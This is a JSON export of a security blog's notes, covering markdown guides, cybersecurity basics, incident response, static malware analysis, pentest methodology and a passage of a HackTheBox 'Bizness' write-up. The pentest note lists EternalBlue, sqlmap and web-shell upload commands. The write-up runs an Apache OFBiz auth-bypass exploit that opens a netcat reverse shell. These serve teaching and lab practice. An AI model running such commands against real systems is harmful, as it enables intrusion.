[
  {
    "id": "MARKDOWN_IMAGE_USAGE",
    "slug": "MARKDOWN_IMAGE_USAGE",
    "title": "Markdown Image Usage Guide",
    "content": "Markdown Image Usage Guide Panduan ini menjelaskan cara menambahkan gambar ke catatan Markdown agar dirender dengan benar di situs. Prosedur Membuat Catatan Bergambar 1. Buat file markdown baru di notes/ Nama file menentukan slug otomatis (contoh: notes/incident response/forensics.md → slug incident response/forensics). Sertakan frontmatter minimal berikut: 2. Siapkan folder gambar di public/images/notes/<slug / Gunakan nama folder yang sama dengan slug catatan. Contoh slug incident response/forensics → folder public/images/notes/incident response/forensics/. Salin semua file gambar (PNG, JPG, WEBP, dsb.) ke folder tersebut. 3. Sematkan gambar di konten markdown Gunakan jalur absolut ke folder publik: Jika terbiasa dengan Obsidian, Anda boleh menulis ![[https://placehold.co/800x460/052e16/34d399.png?text=Directory+Structure|Directory Structure]]; renderer akan mengonversi secara otomatis. 4. Opsional: jalankan skrip pemrosesan gambar Jika gambar masih berada di lokasi lain (mis. hasil ekspor), jalankan pnpm process images note guides/markdown image usage source <folder asal untuk menyalin dan memberi nama sesuai standar. 5. Bangun dan ekspor situs statis pnpm build && pnpm export akan membaca ulang seluruh catatan dan menghasilkan output di folder out/. Deploy isi out/ ke GitHub Pages (mis. gh pages d out). Catatan baru beserta gambarnya otomatis muncul setelah deploy. 1. Struktur Direktori Simpan gambar di public/images/notes/<slug catatan /. Gunakan nama folder yang sama dengan slug catatan untuk menjaga keteraturan. 2. Sintaks Markdown Standar Gunakan jalur absolut yang diawali / agar gambar bisa dilayani oleh Next.js. alt text (dalam contoh Diagram Arsitektur) penting untuk aksesibilitas dan SEO. 3. Dukungan Gaya Obsidian Obsidian syntax ![[path/to/image.png]] secara otomatis dinormalisasi menjadi bentuk Markdown standar, jadi Anda tetap bisa menulis: Renderer akan mengubahnya menjadi sintaks markdown standar dengan alt text \"Diagram Arsitektur\" dan path absolut ke gambar sebelum dirender. 4. Gambar dari URL Eksternal Jalur yang dimulai dengan http:// atau https:// akan digunakan apa adanya. 5. Tips Optimalisasi 1. Gunakan format efisien seperti .webp untuk mengurangi ukuran file. 2. Aktifkan lazy loading dengan tetap menggunakan sintaks standar—renderer menambahkan loading=\"lazy\" dan decoding=\"async\" secara otomatis. 3. Pastikan ukuran gambar tidak melebihi lebar kontainer; renderer sudah mengatur max width: 100% agar gambar responsif. 4. Sediakan alt text deskriptif untuk membantu pembaca yang menggunakan screen reader. 6. Contoh Lengkap Dengan mengikuti panduan ini, seluruh gambar dalam catatan akan dirender konsisten di website.",
    "excerpt": "Markdown Image Usage Guide Panduan ini menjelaskan cara menambahkan gambar ke catatan Markdown agar dirender dengan benar di situs. Prosedur Membuat Catatan Bergambar 1. Buat file markdown baru di notes/ Nama file menent…",
    "description": "Panduan resmi menambahkan gambar ke catatan beserta struktur direktori dan pipeline pemrosesan.",
    "tags": [
      "markdown",
      "images",
      "guide"
    ],
    "category": "guides",
    "type": "notes",
    "url": "/notes/MARKDOWN_IMAGE_USAGE",
    "publishedDate": "2024-01-01",
    "updatedAt": "2024-01-01",
    "readingTime": 2,
    "cover": "https://placehold.co/1200x630/0f172a/34d399.png?text=Markdown+Image+Guide"
  },
  {
    "id": "cybersecurity-fundamentals",
    "slug": "cybersecurity-fundamentals",
    "title": "Cybersecurity Fundamentals",
    "content": "Cybersecurity Fundamentals Introduction Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks. These cyberattacks are usually aimed at accessing, changing, or destroying sensitive information; extorting money from users; or interrupting normal business processes. Implementing effective cybersecurity measures is particularly challenging today because there are more devices than people, and attackers are becoming more innovative. The CIA Triad The foundation of information security consists of three core principles known as the CIA Triad: Confidentiality Ensuring that information is accessible only to those authorized to have access. This involves: Data encryption : Protecting data both in transit and at rest Access controls : Implementing proper authentication and authorization Authentication mechanisms : Multi factor authentication, biometrics Privacy protection : Safeguarding personal and sensitive information Integrity Safeguarding the accuracy and completeness of information and processing methods. Key aspects include: Data validation : Ensuring data hasn't been tampered with Digital signatures : Cryptographic proof of authenticity Version control : Tracking changes and maintaining data history Change management : Controlled processes for system modifications Availability Ensuring that authorized users have access to information when required. This encompasses: System uptime : Maintaining operational systems Disaster recovery : Plans for system restoration after incidents Redundancy : Backup systems and failover mechanisms Performance optimization : Ensuring systems run efficiently Common Threats Malware Malicious software designed to damage or disrupt systems: Viruses : Self replicating programs that attach to other files Spread through infected files and email attachments Can corrupt or delete data Examples: Melissa, ILOVEYOU Worms : Standalone malware that spreads across networks Self propagating without user interaction Can consume network bandwidth Examples: Conficker, WannaCry Trojans : Disguised malware that appears legitimate Often bundled with legitimate software Create backdoors for attackers Examples: Zeus, Emotet Ransomware : Encrypts files and demands payment for decryption Growing threat to organizations Can cause significant business disruption Examples: CryptoLocker, Ryuk Phishing Fraudulent attempts to obtain sensitive information through: Email spoofing : Impersonating legitimate organizations Fake websites : Creating convincing replicas of real sites Social engineering tactics : Psychological manipulation Credential harvesting : Stealing usernames and passwords Social Engineering Psychological manipulation techniques to divulge confidential information: Pretexting : Creating false scenarios to gain trust Baiting : Offering something enticing to trigger actions Quid pro quo : Offering services in exchange for information Tailgating : Following authorized personnel into secure areas Security Controls Preventive Controls Controls designed to prevent security incidents: Firewalls : Network traffic filtering and monitoring Antivirus software : Malware detection and removal Access controls : User authentication and authorization Security awareness training : Educating users about threats Detective Controls Controls that identify security incidents: Intrusion detection systems (IDS) : Network monitoring Log monitoring : Analyzing system and application logs Security audits : Regular security assessments Vulnerability assessments : Identifying system weaknesses Corrective Controls Controls that respond to and recover from incidents: Incident response procedures : Structured response plans Backup and recovery : Data restoration capabilities Patch management : Applying security updates System updates : Maintaining current software versions Best Practices 1. Use Strong Authentication Complex passwords : Long, unique passwords for each account Multi factor authentication : Additional verification layers Biometric verification : Fingerprints, facial recognition Single sign on (SSO) : Centralized authentication management 2. Keep Systems Updated Regular patching : Apply security updates promptly Software updates : Maintain current application versions Security configurations : Implement hardening guidelines Vulnerability management : Regular scanning and remediation 3. Implement Defense in Depth Multiple security layers : Overlapping security controls Network segmentation : Isolating critical systems Endpoint protection : Securing individual devices Data encryption : Protecting sensitive information 4. Regular Security Training Awareness programs : Ongoing security education Phishing simulations : Testing user awareness Security policies : Clear guidelines and procedures Incident reporting : Encouraging threat reporting Risk Management Risk Assessment Process 1. Asset Identification : Catalog all organizational assets 2. Threat Identification : Identify potential threats 3. Vulnerability Assessment : Find system weaknesses 4. Risk Analysis : Evaluate likelihood and impact 5. Risk Treatment : Implement mitigation strategies Risk Treatment Options Risk Avoidance : Eliminating the risk entirely Risk Mitigation : Reducing risk likelihood or impact Risk Transfer : Shifting risk to third parties Risk Acceptance : Acknowledging and accepting risk Compliance and Frameworks Common Frameworks NIST Cybersecurity Framework : Comprehensive security guidance ISO 27001 : International security management standard CIS Controls : Critical security controls implementation COBIT : IT governance and management framework Regulatory Requirements GDPR : European data protection regulation HIPAA : Healthcare information protection SOX : Financial reporting requirements PCI DSS : Payment card industry standards Emerging Threats Advanced Persistent Threats (APTs) Long term, stealthy attacks Nation state and organized crime groups Multi stage attack campaigns Focus on high value targets Internet of Things (IoT) Security Proliferation of connected devices Weak default security configurations Difficulty in patching and updating Potential for large scale botnets Cloud Security Challenges Shared responsibility models Data sovereignty concerns Configuration management Identity and access management Conclusion Cybersecurity is an ongoing process that requires continuous learning, adaptation, and vigilance. By understanding fundamental principles and implementing comprehensive security measures, organizations can better protect themselves against evolving cyber threats. The key to effective cybersecurity lies in: Understanding the threat landscape Implementing layered security controls Maintaining current security practices Fostering a security aware culture Continuously monitoring and improving security posture Remember: Security is not a destination but a journey that requires constant attention and improvement.",
    "excerpt": "Cybersecurity Fundamentals Introduction Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks. These cyberattacks are usually aimed at accessing, changing, or destroying sensiti…",
    "description": "Cybersecurity Fundamentals Introduction Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks. These cyberattacks are usually aimed at accessing, changing, or destroying sensiti…",
    "tags": [
      "cybersecurity",
      "fundamentals",
      "security",
      "basics"
    ],
    "category": "Fundamentals",
    "type": "notes",
    "url": "/notes/cybersecurity-fundamentals",
    "publishedDate": "2024-01-15",
    "updatedAt": "2024-01-15",
    "readingTime": 4,
    "cover": null
  },
  {
    "id": "incident-response/playbook",
    "slug": "incident-response/playbook",
    "title": "Incident Response Playbook",
    "content": "Incident Response Playbook Preparation Phase Team Structure and Roles Incident Commander Responsibilities : Overall response coordination and decision making Authority : Resource allocation and external communication approval Skills Required : Leadership, communication, technical understanding Contact Information : 24/7 availability with multiple contact methods Security Analyst Responsibilities : Technical investigation and analysis Tasks : Log analysis, forensic examination, threat assessment Tools : SIEM, forensic software, analysis platforms Expertise : Malware analysis, network forensics, system administration Communications Lead Responsibilities : Internal and external communications Stakeholders : Management, legal, customers, media, regulators Templates : Pre approved communication templates Channels : Multiple communication methods and backup systems Legal Counsel Responsibilities : Legal and regulatory compliance Areas : Data breach laws, evidence handling, regulatory requirements Contacts : External legal firms, regulatory bodies Documentation : Legal hold procedures, compliance checklists Tools and Resources Incident Response Toolkit Forensic Imaging : dd, FTK Imager, EnCase Memory Analysis : Volatility, Rekall, WinPmem Network Analysis : Wireshark, tcpdump, NetworkMiner Malware Analysis : IDA Pro, Ghidra, Cuckoo Sandbox Communication Systems Primary : Secure messaging platform (Signal, Element) Secondary : Conference bridge with dial in numbers Emergency : Satellite phones for critical situations Documentation : Shared workspace for real time collaboration Detection and Analysis Initial Detection Sources Security Monitoring SIEM Alerts : Correlation rules and anomaly detection IDS/IPS : Network intrusion detection systems EDR : Endpoint detection and response platforms Log Analysis : Centralized logging and analysis User Reports Phishing Reports : Suspicious email notifications System Issues : Performance problems or unusual behavior Data Concerns : Unauthorized access or data exposure Social Engineering : Suspicious phone calls or requests Triage Process Initial Assessment (15 minutes) 1. Verify the Incident : Confirm legitimate security event 2. Classify Severity : Use predefined severity matrix 3. Assign Resources : Allocate appropriate team members 4. Establish Timeline : Set initial response milestones Severity Classification Critical : System compromise, data breach, service outage High : Attempted breach, malware infection, policy violation Medium : Suspicious activity, minor security event Low : False positive, informational alert Evidence Collection Digital Forensics \\\\\\bash Create forensic image dd if=/dev/sda of=/mnt/evidence/disk image.dd bs=4096 conv=noerror,sync Calculate hash for integrity sha256sum /mnt/evidence/disk image.dd /mnt/evidence/disk image.sha256 Memory dump acquisition sudo ./linpmem 2.1.post4 /mnt/evidence/memory.aff4 Network packet capture tcpdump i eth0 w /mnt/evidence/network capture.pcap \\\\\\ Chain of Custody Documentation : Detailed evidence handling log Storage : Secure, tamper evident storage Access Control : Limited access with audit trail Transportation : Secure transfer procedures Containment, Eradication, and Recovery Short term Containment Network Isolation System Quarantine : Isolate affected systems from network Network Segmentation : Implement additional network controls Access Restriction : Disable compromised accounts Traffic Blocking : Block malicious IP addresses and domains Evidence Preservation \\\\\\bash Create system snapshot virsh snapshot create as vm name snapshot name Preserve volatile data ps aux /evidence/running processes.txt netstat tulpn /evidence/network connections.txt lsof /evidence/open files.txt \\\\\\ Long term Containment System Hardening Patch Management : Apply security updates Configuration Changes : Implement security configurations Access Controls : Strengthen authentication and authorization Monitoring Enhancement : Increase logging and monitoring Threat Intelligence IOC Analysis : Indicators of compromise research Attribution : Threat actor identification TTPs : Tactics, techniques, and procedures analysis Threat Landscape : Current threat environment assessment Eradication Malware Removal \\\\\\bash Scan for malware clamscan r infected remove / Remove persistence mechanisms crontab l | grep v malicious script | crontab systemctl disable malicious service \\\\\\ Vulnerability Remediation Patch Installation : Apply security patches Configuration Fixes : Correct misconfigurations Access Revocation : Remove unauthorized access System Rebuilding : Complete system reconstruction if necessary Recovery System Restoration Clean Backups : Restore from verified clean backups System Validation : Verify system integrity and functionality Gradual Restoration : Phased return to normal operations Monitoring : Enhanced monitoring during recovery phase Business Continuity Service Restoration : Prioritize critical business functions User Communication : Inform users of service status Performance Monitoring : Ensure system performance Backup Verification : Confirm backup system functionality Communication and Documentation Internal Communication Stakeholder Notifications Management : Executive briefings and status updates IT Teams : Technical coordination and resource allocation Business Units : Impact assessment and recovery planning Legal/Compliance : Regulatory and legal implications Communication Templates \\\\\\ INCIDENT NOTIFICATION Incident ID: INC 2024 001 Severity: HIGH Status: ACTIVE Summary: Suspected malware infection on critical server Impact: Email services degraded Actions: Containment in progress, investigation ongoing Next Update: 2 hours Contact: incident commander@company.com \\\\\\ External Communication Regulatory Reporting Timeline Requirements : Notification deadlines Required Information : Specific data elements Submission Methods : Approved reporting channels Follow up Requirements : Additional reporting obligations Customer Notification Breach Notification : Data breach disclosure requirements Service Impact : Service availability and performance Remediation Steps : Actions taken to address incident Prevention Measures : Steps to prevent recurrence Post Incident Activities Lessons Learned After Action Review Timeline Analysis : Detailed incident timeline Response Effectiveness : What worked well Improvement Areas : What could be improved Resource Adequacy : Staffing and tool effectiveness Process Improvements Playbook Updates : Revise procedures based on experience Tool Enhancements : Improve detection and response capabilities Training Needs : Identify skill gaps and training requirements Communication Improvements : Enhance notification procedures Metrics and KPIs Response Metrics Mean Time to Detection (MTTD) : Average time to identify incidents Mean Time to Response (MTTR) : Average time to begin response Mean Time to Recovery (MTTR) : Average time to restore services False Positive Rate : Percentage of false alarms Effectiveness Metrics Containment Success : Percentage of successful containments Recovery Time : Time to full operational recovery Cost Impact : Financial impact of incidents Stakeholder Satisfaction : Internal and external satisfaction ratings Legal and Regulatory Considerations Data Breach Laws GDPR : European Union data protection regulation CCPA : California Consumer Privacy Act HIPAA : Health Insurance Portability and Accountability Act SOX : Sarbanes Oxley Act requirements Evidence Handling Chain of Custody : Proper evidence documentation Legal Hold : Preservation of relevant documents Expert Testimony : Preparation for legal proceedings Disclosure Requirements : Legal and regulatory disclosure obligations Conclusion Effective incident response requires preparation, coordination, and continuous improvement. This playbook provides a framework for responding to security incidents while ensuring legal compliance and business continuity.",
    "excerpt": "Incident Response Playbook Preparation Phase Team Structure and Roles Incident Commander Responsibilities : Overall response coordination and decision making Authority : Resource allocation and external communication app…",
    "description": "Incident Response Playbook Preparation Phase Team Structure and Roles Incident Commander Responsibilities : Overall response coordination and decision making Authority : Resource allocation and external communication app…",
    "tags": [
      "incident-response",
      "playbook",
      "containment",
      "forensics"
    ],
    "category": "Incident Response",
    "type": "notes",
    "url": "/notes/incident-response/playbook",
    "publishedDate": "2024-01-25",
    "updatedAt": "2024-01-25",
    "readingTime": 5,
    "cover": null
  },
  {
    "id": "malware-analysis/static-analysis",
    "slug": "malware-analysis/static-analysis",
    "title": "Static Malware Analysis Techniques",
    "content": "Static Malware Analysis Techniques Introduction Static malware analysis involves examining malicious software without executing it. This approach allows analysts to understand the malware's structure, functionality, and potential impact while maintaining a safe analysis environment. Preparation and Safety Analysis Environment Isolated Network : Completely isolated from production networks Virtual Machines : Disposable analysis environments Snapshots : Regular VM snapshots for quick recovery Air Gapped Systems : Physical isolation for highly dangerous samples Safety Protocols Never Execute : Static analysis means no execution Hash Verification : Verify sample integrity with cryptographic hashes Documentation : Maintain detailed analysis logs Chain of Custody : Proper evidence handling procedures File Format Analysis Portable Executable (PE) Analysis PE Headers : Examine DOS, NT, and optional headers Section Analysis : Code, data, and resource sections Import/Export Tables : API dependencies and exposed functions Digital Signatures : Certificate validation and trust chains Other File Formats ELF Files : Linux executable analysis Mach O : macOS binary examination Office Documents : Macro and embedded object analysis PDF Files : JavaScript and embedded content analysis String Analysis Extracting Strings \\\\\\bash Basic string extraction strings malware.exe strings.txt Unicode strings strings e l malware.exe unicode strings.txt Minimum length filtering strings n 8 malware.exe long strings.txt \\\\\\ String Categories URLs and Domains : Network indicators File Paths : Target locations and dependencies Registry Keys : System modification indicators Error Messages : Functionality clues Encryption Keys : Cryptographic artifacts Disassembly and Code Analysis Disassemblers IDA Pro : Industry standard disassembler Ghidra : NSA's open source reverse engineering tool Radare2 : Command line reverse engineering framework x64dbg : Windows debugging and disassembly Assembly Analysis Techniques Control Flow : Function calls and program flow Data Flow : Variable usage and manipulation API Calls : System interaction points Obfuscation Detection : Packed or encrypted code identification Cryptographic Analysis Encryption Detection Entropy Analysis : High entropy indicates encryption/compression Cryptographic Constants : Known algorithm signatures Key Scheduling : Encryption key generation patterns Cipher Identification : Algorithm fingerprinting Hash Analysis \\\\\\bash File hashes md5sum malware.exe sha1sum malware.exe sha256sum malware.exe Import hash (ImpHash) python imphash.py malware.exe Fuzzy hashing ssdeep malware.exe \\\\\\ Metadata Extraction File Properties Compilation Timestamp : When the malware was built Compiler Information : Development environment details Version Information : Embedded version strings Digital Certificates : Code signing information EXIF and Embedded Data Author Information : Creator metadata Creation Tools : Software used for creation Embedded Resources : Icons, strings, and data Hidden Streams : Alternate data streams (ADS) Network Indicators Static Network Analysis Hardcoded IPs : Command and control servers Domain Names : Communication endpoints URL Patterns : Web based communication Protocol Analysis : Network communication methods Configuration Extraction C2 Servers : Command and control infrastructure Encryption Keys : Communication encryption User Agents : HTTP header information Port Numbers : Network service ports Behavioral Indicators File System Operations File Creation : New files and locations File Modification : Target file changes Directory Operations : Folder creation and deletion Hidden Files : Concealment techniques Registry Operations Persistence Mechanisms : Startup and service entries Configuration Storage : Settings and parameters System Modifications : Security and policy changes Forensic Artifacts : Analysis traces Obfuscation and Packing Packing Detection \\\\\\bash Entropy calculation python entropy.py malware.exe Packer identification peid malware.exe detect it easy malware.exe Section analysis objdump h malware.exe \\\\\\ Common Obfuscation Techniques String Encryption : Encrypted string literals Control Flow Obfuscation : Complex branching patterns Dead Code Insertion : Meaningless code additions API Hashing : Dynamic API resolution Documentation and Reporting Analysis Documentation Executive Summary : High level findings Technical Details : Detailed analysis results Indicators of Compromise : IOCs for detection Mitigation Recommendations : Response actions IOC Generation \\\\\\yaml YARA Rule Example rule Malware Family Detection { meta: description = \"Detects specific malware family\" author = \"Security Analyst\" date = \"2024 01 30\" strings: $string1 = \"unique string pattern\" $string2 = { 48 89 E5 48 83 EC 20 } condition: $string1 or $string2 } \\\\\\ Tools and Resources Essential Tools Hex Editors : HxD, 010 Editor Disassemblers : IDA Pro, Ghidra, Radare2 PE Analyzers : PEiD, CFF Explorer, PE bear String Extractors : Strings, FLOSS Hash Calculators : HashCalc, md5deep Online Resources VirusTotal : Multi engine malware scanning Hybrid Analysis : Automated analysis platform Any.run : Interactive malware analysis Joe Sandbox : Comprehensive analysis reports Best Practices Analysis Workflow 1. Initial Triage : Basic file information and hashes 2. String Analysis : Extract and categorize strings 3. Structural Analysis : PE headers and sections 4. Disassembly : Code analysis and function identification 5. IOC Extraction : Generate detection signatures 6. Documentation : Comprehensive analysis report Quality Assurance Peer Review : Second analyst verification Tool Validation : Cross reference with multiple tools False Positive Testing : Validate IOCs against clean files Continuous Learning : Stay updated with new techniques Conclusion Static malware analysis is a critical skill for cybersecurity professionals. By systematically examining malware without execution, analysts can safely understand threats, generate detection signatures, and develop effective countermeasures while minimizing risk to analysis infrastructure.",
    "excerpt": "Static Malware Analysis Techniques Introduction Static malware analysis involves examining malicious software without executing it. This approach allows analysts to understand the malware's structure, functionality, and…",
    "description": "Static Malware Analysis Techniques Introduction Static malware analysis involves examining malicious software without executing it. This approach allows analysts to understand the malware's structure, functionality, and…",
    "tags": [
      "malware",
      "static-analysis",
      "reverse-engineering",
      "security"
    ],
    "category": "Malware Analysis",
    "type": "notes",
    "url": "/notes/malware-analysis/static-analysis",
    "publishedDate": "2024-01-30",
    "updatedAt": "2024-01-30",
    "readingTime": 4,
    "cover": null
  },
  {
    "id": "penetration-testing/methodology",
    "slug": "penetration-testing/methodology",
    "title": "Penetration Testing Methodology",
    "content": "Penetration Testing Methodology Overview Penetration testing is a systematic approach to evaluating the security of an IT infrastructure by safely attempting to exploit vulnerabilities. This methodology follows industry standards and best practices. Testing Phases 1. Planning and Reconnaissance Scope Definition Target Systems : Define which systems, networks, and applications are in scope Testing Methods : Determine black box, white box, or gray box approach Rules of Engagement : Establish testing boundaries and restrictions Timeline : Set testing schedule and milestones Information Gathering (OSINT) Passive Reconnaissance : Gather information without direct interaction DNS enumeration WHOIS lookups Social media research Public records search Active Reconnaissance : Direct interaction with target systems Port scanning Service enumeration Banner grabbing Network mapping 2. Scanning and Enumeration Network Discovery \\\\\\bash Network sweep nmap sn 192.168.1.0/24 Port scanning nmap sS sV O target.com Service enumeration nmap sC sV p target.com UDP scanning nmap sU top ports 1000 target.com \\\\\\ Vulnerability Scanning Automated Tools : Nessus, OpenVAS, Qualys Manual Testing : Custom scripts and techniques Web Application Scanning : Burp Suite, OWASP ZAP Database Scanning : SQLMap, NoSQLMap 3. Gaining Access Exploitation Techniques Network Exploits : Buffer overflows, protocol vulnerabilities Web Application Exploits : SQL injection, XSS, CSRF Social Engineering : Phishing, pretexting, physical access Password Attacks : Brute force, dictionary attacks, credential stuffing Common Exploitation Tools \\\\\\bash Metasploit Framework msfconsole use exploit/windows/smb/ms17 010 eternalblue set RHOSTS target ip exploit SQL Injection with SQLMap sqlmap u \"http://target.com/page.php?id=1\" dbs Web shell upload curl X POST F \"file=@shell.php\" http://target.com/upload.php \\\\\\ 4. Maintaining Access Persistence Mechanisms Backdoors : Hidden access points for future entry Rootkits : Stealth tools to maintain system access Scheduled Tasks : Automated execution of malicious code Registry Modifications : Windows persistence techniques Privilege Escalation Local Privilege Escalation : Exploit local vulnerabilities Domain Privilege Escalation : Active Directory attacks Kernel Exploits : Operating system vulnerabilities Misconfiguration Abuse : Weak permissions and settings 5. Analysis and Reporting Evidence Collection Screenshots : Visual proof of successful exploitation Log Files : System and application logs Network Captures : Packet analysis and traffic flows Command Output : Results of executed commands Risk Assessment CVSS Scoring : Common Vulnerability Scoring System Business Impact : Potential damage to organization Exploitability : Ease of exploitation Remediation Effort : Cost and complexity of fixes OWASP Top 10 Testing 1. Injection Flaws SQL Injection : Database query manipulation NoSQL Injection : NoSQL database attacks LDAP Injection : Directory service attacks Command Injection : Operating system command execution 2. Broken Authentication Session Management : Session fixation, hijacking Password Security : Weak passwords, storage issues Multi factor Authentication : Bypass techniques Account Lockout : Brute force protection testing 3. Sensitive Data Exposure Data in Transit : Unencrypted communications Data at Rest : Unencrypted storage Backup Security : Unsecured backup files Log Security : Sensitive information in logs Tools and Frameworks Network Testing Nmap : Network discovery and port scanning Masscan : High speed port scanner Zmap : Internet wide network scanner Unicornscan : Asynchronous network scanner Web Application Testing Burp Suite : Comprehensive web application testing OWASP ZAP : Open source web application scanner Nikto : Web server scanner Dirb/Dirbuster : Directory and file brute forcing Exploitation Frameworks Metasploit : Comprehensive penetration testing framework Cobalt Strike : Advanced threat emulation platform Empire : PowerShell post exploitation framework BeEF : Browser exploitation framework Post Exploitation Mimikatz : Windows credential extraction BloodHound : Active Directory attack path analysis PowerSploit : PowerShell post exploitation toolkit LinEnum : Linux enumeration script Reporting Best Practices Executive Summary High level Overview : Non technical summary for management Risk Rating : Overall security posture assessment Key Findings : Most critical vulnerabilities Business Impact : Potential consequences of exploitation Technical Details Vulnerability Descriptions : Detailed technical explanations Proof of Concept : Step by step exploitation procedures Evidence : Screenshots, logs, and command output CVSS Scores : Standardized vulnerability ratings Remediation Recommendations Immediate Actions : Critical fixes requiring urgent attention Short term Solutions : Fixes to implement within 30 days Long term Improvements : Strategic security enhancements Compensating Controls : Temporary risk mitigation measures Conclusion Effective penetration testing requires a systematic approach, proper tooling, and comprehensive reporting. Regular testing helps organizations identify and address security weaknesses before they can be exploited by malicious actors.",
    "excerpt": "Penetration Testing Methodology Overview Penetration testing is a systematic approach to evaluating the security of an IT infrastructure by safely attempting to exploit vulnerabilities. This methodology follows industry…",
    "description": "Penetration Testing Methodology Overview Penetration testing is a systematic approach to evaluating the security of an IT infrastructure by safely attempting to exploit vulnerabilities. This methodology follows industry…",
    "tags": [
      "pentest",
      "methodology",
      "security-testing",
      "vulnerability"
    ],
    "category": "Penetration Testing",
    "type": "notes",
    "url": "/notes/penetration-testing/methodology",
    "publishedDate": "2024-01-20",
    "updatedAt": "2024-01-20",
    "readingTime": 4,
    "cover": null
  },
  {
    "id": "snippet-reference",
    "slug": "snippet-reference",
    "title": "Markdown Snippet Reference",
    "content": "Markdown Snippet Reference Dokumen ini menampilkan contoh contoh snippet yang sekarang didukung renderer. 1. Code Fence Standar 2. Code Fence dengan Bahasa 3. Code Fence Gaya Obsidian 4. Code Fence dengan Metadata 5. Callout Blocks [!info] Detection Pipeline Data ingested from sensors is enriched and scored. [!warning] Unusual lateral movement detected across segmented networks. [!tip] Threat Hunting Build hypotheses menggunakan MITRE ATT&CK dan validasi dengan telemetry. [!danger] Immediate Action Required Containment harus dimulai dalam 15 menit. 6. Inline Code Jalankan pemindaian dengan python run scan.py mode=deep lalu review report yang dihasilkan. 7. Tabel Berisi Code | Tool | Perintah | Tujuan | | | | netstat | netstat anp | grep 443 | Melihat koneksi TLS | | lsof | lsof i :8080 | Menemukan PID yang aktif | | nmap | nmap sV script=vuln target.example | Probing exposure | 8. Contoh Campuran [!note] Investigation Notes Host: workstation 33 Trigger: EDR alert Artefak: memory dump, process tree 9. Link dalam Code Block 10. Callout dengan List [!success] Containment Checklist 1. Disable affected accounts. 2. Isolasi sistem terdampak. 3. Deploy aturan deteksi terbaru.",
    "excerpt": "Markdown Snippet Reference Dokumen ini menampilkan contoh contoh snippet yang sekarang didukung renderer. 1. Code Fence Standar 2. Code Fence dengan Bahasa 3. Code Fence Gaya Obsidian 4. Code Fence dengan Metadata 5. Cal…",
    "description": "Contoh snippet markdown yang didukung oleh renderer statis.",
    "tags": [
      "markdown",
      "snippets",
      "renderer"
    ],
    "category": "guides",
    "type": "notes",
    "url": "/notes/snippet-reference",
    "publishedDate": "2024-01-10",
    "updatedAt": "2024-01-10",
    "readingTime": 1,
    "cover": "https://placehold.co/1200x630/111827/34d399.png?text=Markdown+Snippet"
  },
  {
    "id": "https://medium.com/p/72c87fed37b2",
    "slug": "https://medium.com/p/72c87fed37b2",
    "title": "HackTheBox — Bizness",
    "content": "<h3 HackTheBox — Bizness</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/720/1 ruqyxFAV3JEWq4A7qxxZHw.png\" <figcaption Hack The Box — Bizness</figcaption </figure <p Today, I will be tackling the challenge from Hack The Box with the machine code “Bizness”,this machine is Linux based.</p <h4 <strong Enumeration</strong </h4 <p In the first step, we need to conduct information gathering first to check the open ports and identify the services running on the server. Here, I use the Nmap tool for information gathering.</p <pre nmap sCV script vulns Pn oA biness &lt;IP&gt;</pre <p Here is information about the server that we obtained through enumeration using Nmap :</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/634/1 QfkxVewvJDRy1NMC2C7WQA.png\" <figcaption Nmap Result</figcaption </figure <p There are three running services observed, including:</p <ul <li Port 22 &gt; OpenSSH</li <li Port 80 &gt; Http &gt; Nginx 1.18.0</li <li Port 443 &gt; ssl/http &gt; Nginx 1.18.0</li </ul <p Now, I am trying to add a host entry for the IP using the URL “bizness.htb” in the /etc/hosts file.</p <p Next, here I attempt to open the page and gather information for further exploitation. When the website is opened, a landing page will appear as shown in the following image:</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/631/1 Nf2eiQ3YkGA0ujNQf1xsFQ.png\" <figcaption Web page</figcaption </figure <p After further investigation, it seems that there is nothing I can use as an entry point. However, I am trying again to perform Directory Enumeration using Dirsearch.</p <pre dirsearch u &lt;ip&gt;</pre <p Here are the results of the Directory Enumeration:</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/631/1 coBt2GC4CxapBVbpWP1AjQ.png\" <figcaption Dirsearch Result</figcaption </figure <p Here, we successfully obtained the login page at the endpoint (<a href=\"https://bizness.htb/control/login\" https://bizness.htb/control/login</a ), which is the default login page of Apache Ofbiz.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/639/1 nGjYaXqpVn0aBsfRrO T8A.png\" <figcaption Apache OfBiz login page</figcaption </figure <h4 Vulnerability Analysis</h4 <p At this stage, I am attempting to search for public exploit information or CVE related to Apache Ofbiz. When searching for a public exploit for Apache Ofbiz, I came across a documented vulnerability with CVE 2023–51467.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/638/1 zYLU81IDF ppwknOxPgWiA.png\" <figcaption CVE Details</figcaption </figure <p Next, I am searching for exploits related to CVE to analyze whether this used Apache Orbiz is vulnerable to that specific vulnerability.</p <h4 Exploitation</h4 <p Here, I successfully obtained an exploit for performing authentication bypass, which can be found in the following repository : <a href=\"https://github.com/jakabakos/Apache OFBiz Authentication Bypass.git\" Click here</a </p <p It appears that the utilized Apache OFBiz is still vulnerable.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/598/1 nWDu8fm0B6eDoHfCwwW36w.png\" <figcaption Vulnerable target</figcaption </figure <p In the next step, I will attempt to obtain a reverse shell on the server using the following command.</p <pre python3 exploit.py url https://bizness.htb/ cmd 'nc c bash &lt;IP&gt; &lt;PORT&gt;'</pre <p Please set up the listener using netcat beforehand.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/630/1 J8BY8wzncLHGhyRA6t9Giw.png\" <figcaption Netcat listener</figcaption </figure <p Then input the aforementioned exploit command to successfully obtain a Reverse Shell.</p <p As seen in the image below, I have successfully acquired a shell.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/594/1 q17WvjpCZG1i6aREWOPgfA.png\" <figcaption Generated Payload</figcaption </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/639/1 DeVG7HtGeZ8rkDmH4EnA0Q.png\" <figcaption Got reverse shell</figcaption </figure <p The next step is to search for the flag for the local user.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/635/1 tB 3YZS7DwlJiBexhICIg.png\" <figcaption Local flag</figcaption </figure <figure <img 